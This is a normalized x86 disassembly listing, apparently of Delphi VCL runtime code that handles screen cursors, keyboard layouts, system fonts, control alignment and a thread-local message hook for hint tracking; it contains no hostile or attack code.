mov eax [ ebx + 0x8 ]
mov eax [ eax ]
sub eax 0xc
je r-xdata
mov eax [ ebx + 0x4 ]
call sub_44d5a8
mov ecx eax
inc ecx
lea eax [ ebp - 0x4 ]
xor edx edx
call sub_403fdc
mov eax [ ebp - 0x4 ]
call sub_4041ac
push eax
mov eax [ ebp - 0x4 ]
call sub_4043ac
mov edx eax
mov eax [ ebx + 0x4 ]
pop ecx
call sub_44d5b8
mov eax [ ebp - 0x4 ]
call sub_4041ac
test eax eax
jle r-xdata
sub eax 0xafff
jne r-xdata
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_44d664
mov ebx 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46b37d
lea eax [ ebp - 0x4 ]
call sub_403eec
retn
mov eax [ ebx + 0x4 ]
mov dl [ eax + 0x57 ]
mov eax esi
call sub_467158
jmp r-xdata
mov edx ebx
dec edx
lea eax [ ebp - 0x4 ]
call sub_404538
jmp r-xdata
sub dl 0x3
jne r-xdata
inc ebx
dec eax
jne r-xdata
mov edx [ ebp - 0x4 ]
mov dl [ edx + ebx - 0x1 ]
sub dl 0xa
je r-xdata
sub_46b39c
push ebx
push esi
push edi
mov ebx eax
mov eax ebx
call sub_4532b0
test [ ebx + 0x1c ] 0x8
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_4528b8
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov edx edi
mov eax ebx
call sub_4528cc
mov dl [ ebx + 0x57 ]
call sub_44d554
inc edi
dec esi
jne r-xdata
sub_46b440
push ebx
push esi
push edi
add esp 0xffffffd8
mov ebx edx
mov [ esp ] 0x28
push esp
mov eax [ eax + 0x4 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edi ebx
lea esi [ esp + 0x4 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
add esp 0x28
pop edi
pop esi
pop ebx
retn
sub_46b470
push ebx
push esi
push edi
add esp 0xffffffd8
mov ebx edx
mov [ esp ] 0x28
push esp
mov eax [ eax + 0x4 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edi ebx
lea esi [ esp + 0x14 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
add esp 0x28
pop edi
pop esi
pop ebx
retn
sub_46b4a0
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_4209c8
mov eax [ rw-data ]
mov [ eax + 0x4 ] ebx
mov [ eax ] sub_46b844
mov eax [ rw-data ]
mov [ eax + 0x4 ] ebx
mov [ eax ] sub_46b850
mov eax ebx
call sub_46b85c
push 0x0
call GetKeyboardLayout
mov [ ebx + 0x3c ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403144
mov [ ebx + 0x4c ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403144
mov [ ebx + 0x50 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403144
mov [ ebx + 0x54 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403144
mov [ ebx + 0x58 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403144
mov [ ebx + 0x7c ] eax
push 0x0
call GetDC
mov esi eax
push 0x5a
push esi
call GetDeviceCaps
mov [ ebx + 0x40 ] eax
push esi
push 0x0
call ReleaseDC
mov eax [ ebx + 0x58 ]
push eax
mov eax sub_467c78
push eax
push 0x0
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_423870
mov [ ebx + 0x84 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_423870
mov [ ebx + 0x88 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_423870
mov [ ebx + 0x80 ] eax
mov eax ebx
call sub_46bc7c
mov eax [ ebx + 0x84 ]
mov [ eax + 0xc ] ebx
mov [ eax + 0x8 ] sub_46bb58
mov eax [ ebx + 0x88 ]
mov [ eax + 0xc ] ebx
mov [ eax + 0x8 ] sub_46bb58
mov eax [ ebx + 0x80 ]
mov [ eax + 0xc ] ebx
mov [ eax + 0x8 ] sub_46bb58
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4034c0
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403518
pop [ fs : 0x0 ]
add esp 0xc
sub_46b5f8
push ebx
push esi
push edi
push ebp
call sub_403528
mov ebx edx
mov ebp eax
mov eax [ ebp + 0x80 ]
call sub_403174
mov eax [ ebp + 0x88 ]
call sub_403174
mov eax [ ebp + 0x84 ]
call sub_403174
mov eax [ ebp + 0x54 ]
call sub_403174
mov eax [ ebp + 0x50 ]
call sub_403174
mov eax [ ebp + 0x4c ]
call sub_403174
mov eax [ ebp + 0x30 ]
call sub_403174
mov eax [ ebp + 0x34 ]
call sub_403174
mov eax [ ebp + 0x7c ]
call sub_403174
mov eax [ ebp + 0x58 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x58 ]
call sub_403174
mov eax ebp
call sub_46b8b8
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] edx
mov edx ebx
and dl 0xfc
mov eax ebp
call sub_420a14
test bl bl
jle r-xdata
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
call sub_403510
inc esi
xor edi edi
mov eax [ ebp + 0x58 ]
mov edx edi
call sub_4182a8
call sub_403174
inc edi
dec esi
jne r-xdata
sub_46b770
push ebx
mov ebx eax
mov eax [ ebx + 0x68 ]
cmp eax [ ebx + 0x74 ]
je r-xdata
mov eax [ ebx + 0x64 ]
cmp eax [ ebx + 0x70 ]
je r-xdata
mov [ ebx + 0x74 ] eax
cmp [ ebx + 0x9a ] 0x0
je r-xdata
pop ebx
retn
mov [ ebx + 0x70 ] eax
cmp [ ebx + 0x92 ] 0x0
je r-xdata
mov edx ebx
mov eax [ ebx + 0x9c ]
call [ ebx + 0x98 ]
mov edx ebx
mov eax [ ebx + 0x94 ]
call [ ebx + 0x90 ]
sub_46b7bc
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_41814c
mov eax esi
mov edx [ r-xdata ]
call sub_403300
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x4c ]
call sub_41814c
mov eax [ rw-data ]
call sub_46e548
sub_46b7f4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_418444
mov edx esi
mov eax [ ebx + 0x4c ]
call sub_418444
mov eax [ rw-data ]
call sub_46e548
mov eax [ ebx + 0x50 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
mov eax [ rw-data ]
cmp [ eax + 0x84 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x84 ]
call sub_4553f4
sub_46b85c
push ebx
push esi
push edi
push ebp
mov ebp eax
push 0x7f00
push 0x0
call LoadCursorA
mov [ ebp + 0x60 ] eax
mov ebx 0xffffffea
mov esi rw-data
cmp ebx 0xffffffeb
jne r-xdata
cmp ebx 0xfffffff4
jle r-xdata
xor edi edi
mov edi [ rw-data ]
jmp r-xdata
cmp ebx 0xffffffef
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esi ]
push eax
push edi
call LoadCursorA
mov ecx eax
mov edx ebx
mov eax ebp
call sub_46b914
inc ebx
add esi 0x4
cmp ebx 0xffffffff
jne r-xdata
sub_46b8b8
push ebx
push esi
push edi
mov edi eax
mov ebx [ edi + 0x5c ]
test ebx ebx
je r-xdata
push 0x7f00
push 0x0
call LoadCursorA
mov edx [ edi + 0x60 ]
cmp eax edx
je r-xdata
mov eax [ ebx + 0x4 ]
cmp eax 0xffffffef
jl r-xdata
pop edi
pop esi
pop ebx
retn
push edx
call DestroyCursor
cmp eax 0xffffffeb
je r-xdata
cmp eax 0xfffffff4
jle r-xdata
mov eax [ ebx + 0x8 ]
push eax
call DestroyCursor
test eax eax
jle r-xdata
mov esi [ ebx ]
mov edx 0xc
mov eax ebx
call sub_402714
mov ebx esi
test ebx ebx
jne r-xdata
sub_46b914
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax 0xc
call sub_4026f4
mov edx [ ebx + 0x5c ]
mov [ eax ] edx
mov [ eax + 0x4 ] esi
mov [ eax + 0x8 ] edi
mov [ ebx + 0x5c ] eax
pop edi
pop esi
pop ebx
retn
sub_46b93c
push ebp
mov ebp esp
add esp 0xfffffda0
push ebx
xor edx edx
mov [ ebp - 0x260 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_46bae7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x34 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x34 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46baee
lea eax [ ebp - 0x260 ]
call sub_403eec
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403144
mov edx [ ebp - 0x4 ]
mov [ edx + 0x34 ] eax
mov eax [ ebp - 0x4 ]
add eax 0x38
call sub_403eec
lea eax [ ebp - 0x114 ]
push eax
push 0x40
call GetKeyboardLayoutList
dec eax
test eax eax
jl r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
mov [ eax + 0x1d ] 0x0
mov dl 0x1
call sub_41aa14
inc eax
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x114 ]
mov [ ebp - 0x14 ] eax
add [ ebp - 0x14 ] 0x4
dec [ ebp - 0x10 ]
jne r-xdata
lea eax [ ebp - 0xc ]
push eax
push 0x20019
push 0x0
push 0x0
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov [ ebp - 0x25c ] eax
mov [ ebp - 0x258 ] 0x0
lea ecx [ ebp - 0x25c ]
mov edx r-xdata
lea eax [ ebp - 0x254 ]
call sub_408bfc
push eax
push 0x80000002
call RegOpenKeyExA
test eax eax
jne r-xdata
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
call sub_458b9c
test al al
je r-xdata
xor eax eax
push ebp
push j_sub_4038f0#4
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x8 ] 0x100
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x214 ]
push eax
push 0x0
push 0x0
push r-xdata
mov eax [ ebp - 0xc ]
push eax
call RegQueryValueExA
test eax eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
push eax
call RegCloseKey
retn
lea eax [ ebp - 0x260 ]
lea edx [ ebp - 0x214 ]
mov ecx 0x100
call sub_40415c
mov edx [ ebp - 0x260 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
mov ebx [ eax ]
call [ ebx + 0x3c ]
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x3c ]
jne r-xdata
mov eax [ ebp - 0x4 ]
add eax 0x38
lea edx [ ebp - 0x214 ]
mov ecx 0x100
call sub_40415c
sub_46bb58
push ebx
push esi
mov esi edx
mov ebx eax
mov dx 0xb035
mov eax [ rw-data ]
call sub_46e3b8
cmp esi [ ebx + 0x80 ]
jne r-xdata
pop esi
pop ebx
retn
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x88 ] 0x0
je r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_46e16c
mov dl 0x1
mov eax [ rw-data ]
call sub_46e16c
sub_46bbc4
xor ecx ecx
cmp edx 0xffffffff
je r-xdata
mov eax ecx
retn
mov ecx [ eax + 0x5c ]
jmp r-xdata
test ecx ecx
je r-xdata
test ecx ecx
jne r-xdata
cmp edx [ ecx + 0x4 ]
jne r-xdata
mov ecx [ ecx + 0x8 ]
mov ecx [ eax + 0x60 ]
jmp r-xdata
mov ecx [ ecx ]
sub_46bbec
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov esi edx
mov ebx eax
cmp si [ ebx + 0x44 ]
je r-xdata
inc [ ebx + 0x48 ]
mov [ ebx + 0x44 ] si
test si si
jne r-xdata
movsx edx si
mov eax ebx
call sub_46bbc4
push eax
call SetCursor
push esp
call GetCursorPos
push [ esp + 0x4 ]
push [ esp + 0x4 ]
call WindowFromPoint
mov edi eax
test edi edi
je r-xdata
push 0x0
push edi
call __imp_GetWindowThreadProcessId
mov ebp eax
call GetCurrentThreadId
cmp ebp eax
jne r-xdata
mov eax esp
call sub_406ab0
push eax
push 0x0
push 0x84
push edi
call SendMessageA
mov ebx eax
mov dx 0x200
mov eax ebx
call sub_406a38
push eax
push edi
push 0x20
push edi
call SendMessageA
jmp r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_46bc7c
push ebp
mov ebp esp
add esp 0xfffffe6c
push ebx
mov ebx eax
mov [ ebp - 0x1 ] 0x0
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
push ebp
push sub_46bdc1
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
mov al [ eax + 0x88 ]
mov [ ebp - 0x1 ] al
push 0x0
lea eax [ ebp - 0x3d ]
push eax
push 0x3c
push 0x1f
call SystemParametersInfoA
test eax eax
je r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_46e16c
push 0xd
call GetStockObject
mov edx eax
mov eax [ ebx + 0x84 ]
call sub_423c00
lea eax [ ebp - 0x3d ]
push eax
call CreateFontIndirectA
mov edx eax
mov eax [ ebx + 0x84 ]
call sub_423c00
jmp r-xdata
mov eax [ ebx + 0x80 ]
mov edx 0x8
call sub_423ce4
push 0xd
call GetStockObject
mov edx eax
mov eax [ ebx + 0x88 ]
call sub_423c00
lea eax [ ebp - 0xb5 ]
push eax
call CreateFontIndirectA
mov edx eax
mov eax [ ebx + 0x80 ]
call sub_423c00
lea eax [ ebp - 0xf1 ]
push eax
call CreateFontIndirectA
mov edx eax
mov eax [ ebx + 0x88 ]
call sub_423c00
jmp r-xdata
mov [ ebp - 0x191 ] 0x154
push 0x0
lea eax [ ebp - 0x191 ]
push eax
push 0x0
push 0x29
call SystemParametersInfoA
test eax eax
je r-xdata
retn
mov dl [ ebp - 0x1 ]
mov eax [ rw-data ]
call sub_46e16c
mov eax [ ebx + 0x80 ]
mov edx 0xff000017
call sub_423a44
mov eax [ ebx + 0x88 ]
mov edx 0xff000007
call sub_423a44
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46bdc8
cmp [ rw-data ] 0x0
je r-xdata
sub_46be00
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x1 ] cl
xor ecx ecx
mov bl [ ebp - 0x1 ]
dec bl
je r-xdata
mov edx [ edx + 0x44 ]
cmp edx [ eax + 0x44 ]
setg cl
jmp r-xdata
dec bl
je r-xdata
mov eax ecx
pop ebx
pop ecx
pop ebp
retn
mov ecx [ edx + 0x44 ]
add ecx [ edx + 0x4c ]
mov edx [ eax + 0x44 ]
add edx [ eax + 0x4c ]
cmp ecx edx
setl cl
jmp r-xdata
dec bl
je r-xdata
mov edx [ edx + 0x40 ]
cmp edx [ eax + 0x40 ]
setg cl
jmp r-xdata
dec bl
je r-xdata
mov ecx [ edx + 0x40 ]
add ecx [ edx + 0x48 ]
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
cmp ecx edx
setl cl
jmp r-xdata
sub_46be60
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x1 ] dl
mov ebx eax
mov eax [ ebp + 0x8 ]
mov esi [ eax - 0x4 ]
mov esi [ esi + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
sub esi [ eax ]
test esi esi
jl r-xdata
mov esi [ ebx + 0x48 ]
mov al [ ebp - 0x1 ]
add al 0xfd
sub al 0x2
jae r-xdata
mov eax [ ebx + 0x4c ]
mov [ ebp - 0x10 ] eax
mov al [ ebp - 0x1 ]
dec eax
sub al 0x2
jae r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
sub eax [ edx + 0x4 ]
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0xc ] eax
cmp [ ebx + 0x22b ] 0x2
jne r-xdata
cmp [ ebp - 0x1 ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x10 ]
add [ eax + 0x4 ] edx
jmp r-xdata
dec al
je r-xdata
mov eax [ ebx + 0x40 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0x44 ]
mov [ ebp - 0xc ] eax
push 0x3d
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov esi eax
jmp r-xdata
push esi
mov eax [ ebp - 0x10 ]
push eax
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax ebx
mov edi [ eax ]
call [ edi + 0x84 ]
cmp [ ebx + 0x22b ] 0x2
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x10 ]
sub [ eax + 0xc ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0xc ]
mov [ ebp - 0xc ] eax
jmp r-xdata
dec al
je r-xdata
mov al [ ebp - 0x1 ]
dec al
je r-xdata
mov eax [ ebx + 0x48 ]
cmp esi eax
jne r-xdata
sub esi [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
sub [ ebp - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add [ eax ] esi
jmp r-xdata
dec al
je r-xdata
xor edx edx
mov dl [ ebp - 0x1 ]
cmp edx 0x5
ja r-xdata
mov edx [ ebx + 0x4c ]
cmp edx [ ebp - 0x10 ]
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
sub [ eax + 0x8 ] esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
jmp [ edx * 4 + jump_table_46bf9c ]
mov eax [ ebp - 0x10 ]
sub eax [ ebx + 0x4c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
sub [ edx + 0x4 ] eax
jmp r-xdata
mov eax [ ebp - 0x10 ]
sub eax [ ebx + 0x4c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
add [ edx + 0xc ] eax
jmp r-xdata
sub esi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
sub [ eax ] esi
jmp r-xdata
sub esi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add [ eax + 0x8 ] esi
jmp r-xdata
sub esi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add [ eax + 0x8 ] esi
mov eax [ ebp - 0x10 ]
sub eax [ ebx + 0x4c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
add [ edx + 0xc ] eax
sub_46c010
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x1 ] al
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ ebp + 0x8 ]
cmp [ eax - 0xc ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_46b768
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
cmp [ eax + 0x30 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
inc edi
mov [ ebp - 0x8 ] 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
test [ eax + 0x1c ] 0x10
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
inc edi
mov [ ebp - 0x8 ] 0x0
inc [ ebp - 0x8 ]
dec edi
jne r-xdata
mov al [ ebx + 0x5b ]
cmp al [ ebp - 0x1 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0x8 ]
call sub_4182a8
mov dl [ ebp - 0x1 ]
call sub_46be60
pop ecx
inc [ ebp - 0x8 ]
dec edi
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ ebp - 0x8 ]
call sub_46b754
mov ebx eax
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov al [ eax + 0x5b ]
cmp al [ ebp - 0x1 ]
jne r-xdata
cmp [ ebx + 0x57 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
cmp [ eax + 0x22b ] 0x1
je r-xdata
cmp [ ebx + 0x22b ] 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_41814c
mov eax [ ebp + 0x8 ]
cmp ebx [ eax - 0xc ]
je r-xdata
xor esi esi
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp esi [ eax + 0x8 ]
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx ebx
mov edx esi
call sub_418324
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx esi
call sub_4182a8
mov edx eax
mov cl [ ebp - 0x1 ]
mov eax ebx
call sub_46be00
test al al
je r-xdata
inc esi
sub_46c15c
push ebp
mov ebp esp
push ebx
push esi
mov bl 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_46b768
mov esi eax
dec esi
cmp esi 0x0
jl r-xdata
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx esi
call sub_46b754
cmp [ eax + 0x30 ] 0x0
jne r-xdata
dec esi
cmp esi 0xffffffff
jne r-xdata
test [ eax + 0x1c ] 0x10
jne r-xdata
cmp [ eax + 0x5b ] 0x0
je r-xdata
cmp [ eax + 0x57 ] 0x0
je r-xdata
cmp [ eax + 0x22b ] 0x1
jne r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
sub_46c1b4
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x10 ] eax
push ebp
call sub_46c15c
pop ecx
test al al
je r-xdata
mov esp ebp
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403144
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push j_sub_4038f0#3
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
mov al 0x1
call sub_46c010
pop ecx
push ebp
mov al 0x2
call sub_46c010
pop ecx
push ebp
mov al 0x3
call sub_46c010
pop ecx
push ebp
mov al 0x4
call sub_46c010
pop ecx
push ebp
mov al 0x5
call sub_46c010
pop ecx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_403174
retn
sub_46c23c
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_46bdd0
xor eax eax
push ebp
push sub_46c2b5
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
lea eax [ ebp - 0x14 ]
push eax
push 0x0
push 0x30
call SystemParametersInfoA
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_46c1b4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
and [ eax + 0x8e ] 0xffef
mov eax [ ebp - 0x4 ]
call sub_46bdd8
retn
mov eax [ ebp - 0x4 ]
or [ eax + 0x8e ] 0x10
jmp r-xdata
pop ebx
mov esp ebp
pop ebp
retn
sub_46c2d0
push ebx
push esi
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
mov eax esi
call sub_403eec
pop esi
pop ebx
retn
cmp [ ebx + 0x80 ] 0x0
jne r-xdata
mov eax esi
mov edx [ ebx + 0x80 ]
call sub_403f40
pop esi
pop ebx
retn
mov ebx [ ebx + 0x30 ]
jmp r-xdata
test ebx ebx
jne r-xdata
sub_46c328
push ebp
mov ebp esp
push ebx
push esi
push edi
cmp [ rw-data ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
xor eax eax
push ebp
push sub_46c359
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
call sub_46e774
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_46c37c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx rw-data
call GetCurrentThreadId
mov [ rw-data ] eax
jmp r-xdata
push 0x64
mov eax [ rw-data ]
push eax
call WaitForSingleObject
cmp eax 0x102
je r-xdata
cmp [ ebx ] 0x0
je r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
mov eax [ ebx ]
cmp [ eax + 0x60 ] 0x0
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
call GetCursorPos
lea eax [ ebp - 0x8 ]
call sub_44beac
test eax eax
jne r-xdata
mov eax [ ebx ]
call sub_46e7f0
sub_46c3d8
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi [ ebp + 0x10 ]
mov ebx [ ebp + 0x8 ]
push esi
mov eax [ ebp + 0xc ]
push eax
push ebx
mov eax [ rw-data ]
push eax
call CallNextHookEx
mov edi eax
test ebx ebx
jl r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
cmp [ rw-data ] 0x0
je r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_46d890
sub_46c41c
push ecx
mov eax [ rw-data ]
cmp [ eax + 0xa5 ] 0x0
jne r-xdata
pop edx
retn
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
call GetCurrentThreadId
push eax
push 0x0
mov eax sub_46c3d8
push eax
push 0x3
call SetWindowsHookExA
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push 0x0
push 0x0
push 0x0
call CreateEventA
mov [ rw-data ] eax
push esp
push 0x0
push 0x0
push sub_46c37c
push 0x3e8
push 0x0
call CreateThread
mov [ rw-data ] eax
sub_46c490
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
call UnhookWindowsHookEx
retn
mov eax [ rw-data ]
push eax
call SetEvent
call GetCurrentThreadId
cmp eax [ rw-data ]
je r-xdata
mov eax [ rw-data ]
push eax
call CloseHandle
xor eax eax
mov [ rw-data ] eax
push 0xffffffff
mov eax [ rw-data ]
push eax
call WaitForSingleObject
sub_46c4ec
add esp 0xfffffff8
mov [ esp ] 0x8
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x8
push 0x48
call SystemParametersInfoA
test eax eax
je r-xdata
xor eax eax
pop ecx
pop edx
retn
cmp [ esp + 0x4 ] 0x0
setne al
pop ecx
pop edx
retn
sub_46c51c
add esp 0xfffffff8
mov [ esp ] 0x8
cmp al 0x1
cmc
sbb eax eax
mov [ esp + 0x4 ] eax
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x8
push 0x49
call SystemParametersInfoA
pop ecx
pop edx
retn
sub_46c544
push ebx
push esi
push edi
mov edi edx
mov esi eax
call sub_46c4ec
mov ebx eax
test bl bl
je r-xdata
push edi
push esi
call ShowWindow
test bl bl
je r-xdata
xor eax eax
call sub_46c51c
pop edi
pop esi
pop ebx
retn
mov al 0x1
call sub_46c51c
sub_46c584
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
push esi
test dl dl
je r-xdata
